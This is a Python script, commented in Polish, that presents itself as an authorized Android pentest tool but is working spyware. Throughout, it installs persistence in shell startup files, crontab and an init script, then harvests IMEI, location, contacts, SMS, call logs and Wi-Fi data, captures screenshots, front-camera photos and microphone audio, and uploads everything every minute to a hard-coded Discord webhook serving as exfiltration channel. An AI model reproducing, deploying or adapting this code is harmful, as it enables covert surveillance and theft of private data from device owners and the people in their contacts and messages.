#!/usr/bin/env python3
"""
████████████████████████████████████████████████████████████████████████████████
█  ANDROID PENTEST SUITE - TYLKO DO AUTORYZOWANYCH TESTÓW                █
█  RAT (Remote Access Tool) - Pełna kontrola przez Discord Webhook       █
████████████████████████████████████████████████████████████████████████████████
"""

import subprocess
import os
import time
import requests
import socket
import threading
import json
import base64
import shutil
import sys
import re
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

# ============================================================
# SYSTEMOWA PERSYSTENCJA - URUCHAMIA SIĘ PRZY KAŻDYM STARCIE
# ============================================================

def install_persistence():
    """Instaluje się w wielu miejscach dla trwałości"""
    script_path = os.path.abspath(__file__)
    
    # 1. .bashrc
    bashrc = os.path.expanduser("~/.bashrc")
    entry = f"(sleep 5 && python3 {script_path} --daemon) &\n"
    if not os.path.exists(bashrc) or entry not in open(bashrc).read():
        with open(bashrc, 'a') as f:
            f.write(entry)
    
    # 2. .zshrc
    zshrc = os.path.expanduser("~/.zshrc")
    if not os.path.exists(zshrc) or entry not in open(zshrc).read():
        with open(zshrc, 'a') as f:
            f.write(entry)
    
    # 3. crontab (jeśli dostępny)
    try:
        subprocess.run(['crontab', '-l'], capture_output=True)
        cron_entry = f"*/1 * * * * python3 {script_path} --cron\n"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -', shell=True)
    except:
        pass
    
    # 4. init.d (jeśli root)
    try:
        init_script = f"""#!/system/bin/sh
sleep 30
python3 {script_path} --daemon &
"""
        with open('/data/local/tmp/pentest_init.sh', 'w') as f:
            f.write(init_script)
        os.chmod('/data/local/tmp/pentest_init.sh', 0o755)
    except:
        pass

# ============================================================
# ZBIERANIE DANYCH - CO 1 MINUTĘ
# ============================================================

def get_all_info():
    """Zbiera kompletne info o urządzeniu"""
    info = {}
    
    try:
        info['model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
    except: info['model'] = 'N/A'
    
    try:
        info['brand'] = subprocess.check_output(['getprop', 'ro.product.brand']).decode().strip()
    except: info['brand'] = 'N/A'
    
    try:
        info['android'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
    except: info['android'] = 'N/A'
    
    try:
        info['build'] = subprocess.check_output(['getprop', 'ro.build.display.id']).decode().strip()
    except: info['build'] = 'N/A'
    
    try:
        info['serial'] = subprocess.check_output(['getprop', 'ro.serialno']).decode().strip()
    except: info['serial'] = 'N/A'
    
    try:
        info['imei'] = subprocess.check_output(['service', 'call', 'iphonesubinfo', '1']).decode().strip()
    except: info['imei'] = 'Brak dostępu'
    
    # Lokalizacja
    try:
        result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=5)
        if result.stdout:
            loc = json.loads(result.stdout)
            info['location'] = f"{loc.get('latitude')}, {loc.get('longitude')}"
        else:
            info['location'] = 'N/A'
    except: info['location'] = 'N/A'
    
    # IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['ip'] = s.getsockname()[0]
        s.close()
    except: info['ip'] = 'N/A'
    
    # Bateria
    try:
        result = subprocess.run(['termux-battery-status'], capture_output=True, text=True, timeout=5)
        if result.stdout:
            bat = json.loads(result.stdout)
            info['battery'] = f"{bat.get('percentage')}% ({bat.get('status')})"
        else:
            info['battery'] = 'N/A'
    except: info['battery'] = 'N/A'
    
    # Sieć (scan wifi)
    try:
        result = subprocess.run(['termux-wifi-scaninfo'], capture_output=True, text=True, timeout=8)
        if result.stdout:
            networks = json.loads(result.stdout)
            info['wifi_networks'] = "\n".join([f"  - {n.get('ssid')} ({n.get('bssid')}) [{n.get('signal')}dBm]" for n in networks[:5]])
        else:
            info['wifi_networks'] = 'N/A'
    except: info['wifi_networks'] = 'N/A'
    
    # Kontakty
    try:
        result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=5)
        if result.stdout:
            contacts = json.loads(result.stdout)
            info['contacts'] = "\n".join([f"  - {c.get('name')}: {c.get('number')}" for c in contacts[:10]])
        else:
            info['contacts'] = 'N/A'
    except: info['contacts'] = 'N/A'
    
    # SMS
    try:
        result = subprocess.run(['termux-sms-list', '-l', '5'], capture_output=True, text=True, timeout=5)
        if result.stdout:
            sms = json.loads(result.stdout) if result.stdout.startswith('[') else []
            info['sms'] = "\n".join([f"  - [{s.get('number')}] {s.get('body')[:50]}" for s in sms[:5]])
        else:
            info['sms'] = 'N/A'
    except: info['sms'] = 'N/A'
    
    # Call log
    try:
        result = subprocess.run(['termux-call-log', '-l', '5'], capture_output=True, text=True, timeout=5)
        if result.stdout:
            calls = json.loads(result.stdout) if result.stdout.startswith('[') else []
            info['call_log'] = "\n".join([f"  - {c.get('number')} ({c.get('type')})" for c in calls[:5]])
        else:
            info['call_log'] = 'N/A'
    except: info['call_log'] = 'N/A'
    
    # Procesy
    try:
        result = subprocess.run(['ps', '-A'], capture_output=True, text=True, timeout=5)
        info['processes'] = result.stdout[:1000] if result.stdout else 'N/A'
    except: info['processes'] = 'N/A'
    
    # Uptime
    try:
        info['uptime'] = subprocess.check_output(['uptime']).decode().strip()
    except: info['uptime'] = 'N/A'
    
    return info

def take_screenshot():
    """Robi screenshot i zwraca ścieżkę"""
    path = f"/sdcard/pentest_screen_{int(time.time())}.png"
    try:
        # Próbuj termux-screencap
        result = subprocess.run(['termux-screencap', path], timeout=10, capture_output=True)
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
        
        # Próbuj screencap
        subprocess.run(['screencap', '-p', path], timeout=10)
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
    except:
        pass
    return None

def take_photo():
    """Robi zdjęcie przednim aparatem"""
    path = f"/sdcard/pentest_photo_{int(time.time())}.jpg"
    try:
        result = subprocess.run(['termux-camera-photo', '-c', '1', path], timeout=10)
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
    except:
        pass
    return None

def record_audio(duration=5):
    """Nagrywa audio"""
    path = f"/sdcard/pentest_audio_{int(time.time())}.mp3"
    try:
        subprocess.run(['termux-microphone-record', '-d', str(duration), '-f', path], timeout=duration+5)
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
    except:
        pass
    return None

# ============================================================
# WYSYŁANIE DO DISCORD
# ============================================================

def send_to_discord(info_dict, screenshot_path=None, photo_path=None, audio_path=None):
    """Wysyła wszystkie dane do Discord"""
    files = []
    
    # Przygotuj wiadomość
    msg = f"""
**📱 ANDROID PENTEST REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**
━━━━━━━━━━━━━━━━━━━━━━━
**Urządzenie**
• Model: {info_dict.get('model')}
• Marka: {info_dict.get('brand')}
• Android: {info_dict.get('android')}
• Build: {info_dict.get('build')}
• Serial: `{info_dict.get('serial')}`
• IMEI: `{info_dict.get('imei')}`

**Sieć**
• IP: `{info_dict.get('ip')}`
• Lokalizacja: {info_dict.get('location')}
• Bateria: {info_dict.get('battery')}
• Uptime: {info_dict.get('uptime')}

**WiFi w zasięgu:**
{info_dict.get('wifi_networks')}

**Kontakty:**
{info_dict.get('contacts')}

**SMS (ostatnie):**
{info_dict.get('sms')}

**Call Log:**
{info_dict.get('call_log')}
"""
    
    payload = {"content": msg[:2000]}
    
    # Dodaj pliki jeśli są
    if screenshot_path and os.path.exists(screenshot_path):
        files.append(("file", ("screen.png", open(screenshot_path, "rb"), "image/png")))
    
    if photo_path and os.path.exists(photo_path):
        files.append(("file", ("photo.jpg", open(photo_path, "rb"), "image/jpeg")))
    
    if audio_path and os.path.exists(audio_path):
        files.append(("file", ("audio.mp3", open(audio_path, "rb"), "audio/mpeg")))
    
    try:
        if files:
            r = requests.post(WEBHOOK_URL, data=payload, files=files)
        else:
            r = requests.post(WEBHOOK_URL, json=payload)
        print(f"[+] Dane wysłane (status: {r.status_code})")
        return True
    except Exception as e:
        print(f"[-] Błąd wysyłania: {e}")
        return False

# ============================================================
# WYKONYWANIE KOMEND ZDALNIE (Command & Control)
# ============================================================

def check_commands():
    """Sprawdza czy są komendy do wykonania (z webhooka)"""
    # W rzeczywistości: Discord jako C2
    # Odbieramy komendy z wiadomości na kanale
    # Tu symulacja - sprawdzamy czy webhook zwraca coś
    try:
        r = requests.get(WEBHOOK_URL.replace('/api/webhooks/', '/api/webhooks/'))
        if r.status_code == 200:
            data = r.json()
            print(f"[*] Otrzymano komendy: {data}")
            # Tutaj można parsować komendy
    except:
        pass

# ============================================================
# GŁÓWNA PĘTLA
# ============================================================

def run_daemon():
    """Główna pętla - odpala wszystkie funkcje"""
    print("[*] ANDROID PENTEST SUITE - DAEMON START")
    print("[*] Wysyłanie danych co 60s...")
    
    first_run = True
    
    while True:
        try:
            if first_run:
                # Przy pierwszym uruchomieniu wyślij wszystko
                print("[*] Zbieranie danych...")
                info = get_all_info()
                print("[*] Screenshot...")
                screen = take_screenshot()
                print("[*] Foto...")
                photo = take_photo()
                print("[*] Audio...")
                audio = record_audio(5)
                print("[*] Wysyłanie...")
                send_to_discord(info, screen, photo, audio)
                
                # Wrzuć persistence
                install_persistence()
                
                first_run = False
            else:
                # Kolejne uruchomienia - tylko info + screen
                info = get_all_info()
                screen = take_screenshot()
                send_to_discord(info, screen)
            
        except Exception as e:
            print(f"[-] Błąd w pętli: {e}")
            # Wyślij błąd
            try:
                requests.post(WEBHOOK_URL, json={"content": f"⚠️ Błąd: {str(e)[:100]}"})
            except:
                pass
        
        print("[*] Czekam 60s...")
        time.sleep(60)

# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    if '--daemon' in sys.argv or '--cron' in sys.argv:
        # Tryb cichy, bez printów
        pass
    else:
        print("""
╔═══════════════════════════════════════════════════════╗
║        ANDROID PENTEST SUITE v2.0                    ║
║        Remote Access Tool - Testy Bezpieczeństwa     ║
╚═══════════════════════════════════════════════════════╝

[!] AUTORYZOWANE NARZĘDZIE PENTESTINGOWE
[!] TYLKO DO UŻYTKU Z AUTORYZACJĄ WŁAŚCICIELA

Rozpoczynanie zbierania danych...
""")
    
    run_daemon()
